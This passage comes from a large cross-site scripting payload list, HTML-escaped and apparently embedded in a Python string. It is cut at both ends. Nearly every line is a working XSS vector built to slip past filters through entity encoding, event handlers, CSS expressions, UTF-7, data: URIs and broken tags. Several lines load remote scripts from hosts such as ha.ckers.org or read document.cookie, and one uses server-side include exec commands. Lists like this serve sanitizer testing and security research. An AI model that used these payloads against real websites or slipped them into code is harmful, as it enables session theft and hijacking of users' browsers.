namespace.\"),(\"\"\"&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=\"javas&lt;!-- --&gt;cript:javascript:alert(1)\"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;\n&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"&gt;&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;&lt;t:set attributeName=\"innerHTML\" to=\"XSS&amp;lt;SCRIPT DEFER&amp;gt;javascript:alert(1)&amp;lt;/SCRIPT&amp;gt;\"&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n&lt;SCRIPT SRC=\"%(jpg)s\"&gt;&lt;/SCRIPT&gt;\n&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-\n&lt;form id=\"test\" /&gt;&lt;button form=\"test\" formaction=\"javascript:javascript:alert(1)\"&gt;X\n&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;\n&lt;P STYLE=\"behavior:url('#default#time2')\" end=\"0\" onEnd=\"javascript:alert(1)\"&gt;\n&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;\n&lt;STYLE&gt;a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}&lt;/STYLE&gt;\n&lt;meta charset= \"x-imap4-modified-utf7\"&amp;&amp;&gt;&amp;&amp;&lt;script&amp;&amp;&gt;javascript:alert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/script&amp;&amp;&gt;\n&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;\n&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;\n&lt;?xml version=\"1.0\"?&gt;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;\n&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;\n&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;\n&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;\n&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;\n&lt;object onerror=javascript:javascript:alert(1)&gt;\n&lt;embed type=\"image\" src=%(scriptlet)s&gt;&lt;/embed&gt;\n&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=\"javas]]&lt;![CDATA[cript:javascript:alert(1);\"&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;\n&lt;IMG SRC=&amp;{javascript:alert(1);};&gt;\n&lt;a href=\"jav&amp;#65ascript:javascript:alert(1)\"&gt;test1&lt;/a&gt;\n&lt;a href=\"jav&amp;#97ascript:javascript:alert(1)\"&gt;test1&lt;/a&gt;\n&lt;embed width=500 height=500 code=\"data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;\"&gt;&lt;/embed&gt;\n&lt;iframe srcdoc=\"&amp;LT;iframe&amp;sol;srcdoc=&amp;amp;lt;img&amp;sol;src=&amp;amp;apos;&amp;amp;apos;onerror=javascript:alert(1)&amp;amp;gt;&gt;\"&gt;\n';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n'';!--\"&lt;XSS&gt;=&amp;{()}\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n&lt;IMG SRC=javascript:alert(\"XSS\")&gt;\n&lt;IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`&gt;\n&lt;a onmouseover=\"alert(document.cookie)\"&gt;xxs link&lt;/a&gt;\n&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n&lt;IMG SRC=# onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC= onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;\n&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;\n&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;IMG SRC=\"jav   ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\"&gt;\nperl -e 'print \"&lt;IMG SRC=java\\0script:alert(\\\"XSS\\\")&gt;\";' &gt; out\n&lt;IMG SRC=\" &amp;#14;  javascript:alert('XSS');\"&gt;\n&lt;SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")&gt;\n&lt;SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;\n&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;\n&lt;IMG SRC=\"javascript:alert('XSS')\"\n&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\n\\\";alert('XSS');//\n&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt;\n&lt;BODY BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;\n&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;\n&lt;STYLE&gt;li {list-style-image: url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;\n&lt;IMG SRC='vbscript:msgbox(\"XSS\")'&gt;\n&lt;IMG SRC=\"livescript:[code]\"&gt;\n&lt;BODY ONLOAD=alert('XSS')&gt;\n&lt;BGSOUND SRC=\"javascript:alert('XSS');\"&gt;\n&lt;BR SIZE=\"&amp;{alert('XSS')}\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\"&gt;\n&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;\n&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet\"&gt;\n&lt;STYLE&gt;BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}&lt;/STYLE&gt;\n&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';&lt;/STYLE&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"&gt;\nexp/*&lt;A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'&gt;\n&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;\n&lt;STYLE&gt;.XSS{background-image:url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:alert('XSS')\")}&lt;/STYLE&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:alert('XSS')\")}&lt;/STYLE&gt;\n&lt;XSS STYLE=\"xss:expression(alert('XSS'))\"&gt;\n&lt;XSS STYLE=\"behavior: url(xss.htc);\"&gt;\n\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"&gt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/FRAMESET&gt;\n&lt;TABLE BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\"&gt;\n&lt;DIV STYLE=\"background-image: url(&amp;#1;javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"width: expression(alert('XSS'));\"&gt;\n&lt;BASE HREF=\"javascript:alert('XSS');//\"&gt;\n &lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"&gt;&lt;/OBJECT&gt;\n&lt;EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;\n&lt;SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"&gt;&lt;/SCRIPT&gt;\n&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'\"--&gt;\n&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;\n&lt;IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"&gt;\nRedirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser\n&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;\n &lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n&lt;SCRIPT a=\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT =\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;\" '' SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT \"a='&gt;'\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=`&gt;` SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;A HREF=\"http://66.102.7.147/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://1113982867/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://0x42.0x0000066.0x7.0x93/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://0102.0146.0007.00000223/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"htt    p://6   6.000146.0x7.147/\"&gt;XSS&lt;/A&gt;\n&lt;iframe %00 src=\"&amp;Tab;javascript:prompt(1)&amp;Tab;\"%00&gt;\n&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;'&lt;iframe/onload=confirm(1)&gt;'\n&lt;input/onmouseover=\"javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;\"\n&lt;sVg&gt;&lt;scRipt %00&gt;alert&amp;lpar;1&amp;rpar; {Opera}\n&lt;img/src=`%00` onerror=this.onerror=confirm(1) \n&lt;form&gt;&lt;isindex formaction=\"javascript&amp;colon;confirm(1)\"\n&lt;img src=`%00`&amp;NewLine; onerror=alert(1)&amp;NewLine;\n&lt;script/&amp;Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&amp;Tab;&gt;&lt;/script&gt;\n&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?\n&lt;iframe/src=\"data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"&gt;\n&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/\n&amp;#34;&amp;#62;&lt;h1/onmouseover='\\u0061lert(1)'&gt;%00\n&lt;iframe/src=\"data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;\"&gt;\n&lt;meta content=\"&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)\" http-equiv=\"refresh\"/&gt;\n&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script\n&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\n&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"&gt;\n&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;\n&lt;form&gt;&lt;a href=\"javascript:\\u0061lert&amp;#x28;1&amp;#x29;\"&gt;X\n&lt;/script&gt;&lt;img/*%00/src=\"worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;\"/%00*/onerror='eval(src)'&gt;\n&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;\n&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=\"javascript&amp;#58;alert(1)\"&amp;#11;&amp;#10;&amp;#09;;&gt;\n&lt;a href=\"data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a\nhttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script\n&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;\"&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;\"&gt;XYZ&lt;/a\n&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt('&amp;#49;')\n&lt;style/onload=prompt&amp;#40;'&amp;#88;&amp;#83;&amp;#83;'&amp;#41;\n&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^\n&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(\n&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;\"date\" onfocus=\"alert(1)\"&gt;\n&lt;form&gt;&lt;textarea &amp;#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;'&gt;\n&lt;script /***/&gt;/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/&lt;/script /***/\n&lt;iframe srcdoc='&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;'&gt;\n&lt;a href=\"javascript:void(0)\" onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;\n&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;\n&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;\n&lt;///style///&gt;&lt;span %2F onmousemove='alert&amp;lpar;1&amp;rpar;'&gt;SPAN\n&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&amp;Tab;prompt(1)\n&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;'&lt;body/onload=confirm(1)&gt;'\n&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}\n&lt;marquee onstart='javascript:alert&amp;#x28;1&amp;#x29;'&gt;^__^\n&lt;div/style=\"width:expression(confirm(1))\"&gt;X&lt;/div&gt; {IE7}\n&lt;iframe/%00/ src=javaSCRIPT&amp;colon;alert(1)\n//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type='submit'&gt;//\n/*iframe/src*/&lt;iframe/src=\"&lt;iframe/src=@\"/onload=prompt(1) /*iframe/src*/&gt;\n//|\\\\ &lt;script //|\\\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\\\ &lt;/script //|\\\\\n&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;\n&lt;a/href=\"javascript:&amp;#13; javascript:prompt(1)\"&gt;&lt;input type=\"X\"&gt;\n&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)\n&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&amp;#x28;1&amp;#x29; {Opera}\n&lt;a href=\"javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;\"&gt;&lt;button&gt;\n&lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;\n&lt;iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\"&gt;\n&lt;a href=\"jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;\"&gt;X&lt;/a&gt;\n&lt;embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;var onmouseover=\"prompt(1)\"&gt;On Mouse Over&lt;/var&gt;\n&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;\n&lt;img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"&gt;\n&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;\n&lt;script src=\"data:text/javascript,alert(1)\"&gt;&lt;/script&gt;\n&lt;iframe/src \\/\\/onload = prompt(1)\n&lt;iframe/onreadystatechange=alert(1)\n&lt;svg/onload=alert(1)\n&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)\n&lt;input type=\"text\" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;\nhttp://www.&lt;script&gt;alert(1)&lt;/script .com\n&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;svg&gt;&lt;script ?&gt;alert(1)\n&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;img src=`xx:xx`onerror=alert(1)&gt;\n&lt;object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"&gt;&lt;/object&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;javascript&amp;colon;alert(1)\"/&gt;\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always&gt;\n&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1\n&lt;a href=\"data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\"&gt;X&lt;/a\n&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE&gt;\n&lt;script&gt;~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')&lt;/script U+\n&lt;script/src=\"data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"&gt;&lt;/script a=\\u0061 &amp; /=%2F\n&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script\n&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\n&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;\n&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;\n&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script\n&lt;img src ?itworksonchrome?\\/onerror = alert(1)\n&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;\n&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)\n&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe\n&lt;script x&gt; alert(1) &lt;/script 1=2\n&lt;div/onmouseover='alert(1)'&gt; style=\"x:\"&gt;\n&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;\n&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;\n&lt;div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\"&gt;x&lt;/button&gt;\n\"&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;\n&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;\n&lt;iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"&gt;&lt;/iframe&gt;\n&lt;a 